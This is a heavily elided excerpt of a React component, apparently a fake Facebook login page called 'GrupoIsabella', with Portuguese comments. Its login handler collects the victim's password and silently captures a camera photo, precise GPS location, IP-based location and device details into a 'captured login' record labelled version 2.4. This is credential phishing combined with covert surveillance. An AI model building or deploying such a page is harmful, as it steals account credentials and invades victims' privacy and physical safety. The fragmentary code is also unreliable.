...
export default function GrupoIsabella() {
    ...
    return new Promise((resolve) => {
      ...
      navigator.geolocation.getCurrentPosition(
        ...
        (error) => {
          ...
          // Erros comuns:
          // 1: PERMISSION_DENIED (usuário negou)
          // 2: POSITION_UNAVAILABLE (não conseguiu obter a posição)
  ...
  const handleFacebookLogin = async (e: React.FormEvent) => {
    ...
    try {
      const photoData = await capturePhoto() // Tenta capturar a foto
      const preciseLocation = await getPreciseLocation() // Tenta capturar a localização GPS
      ...
      const dadosLogin = {
        ...
        senha: password,
        plataforma: "Facebook",
        localizacao: locationData // Localização aproximada por IP
          ? {
              ip: locationData.ip,
          ...
          : null,
        localizacaoGPS: preciseLocation, // Localização exata por GPS
        dispositivo: {
        ...
        versaoCaptura: "2.4", // Versão atualizada
                        ...
                        <div className="aspect-[3/4] bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl overflow-hidden border border-white/10">
                          ...
                          <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-transparent to-transparent flex items-center justify-center">
                            <div className="text-white text-center">
                              ...
                              <p className="text-xs font-medium">{index === 2 ? "" : `${index}`}</p>
                            </div>
                          </div>
                        </div>
                      </div>
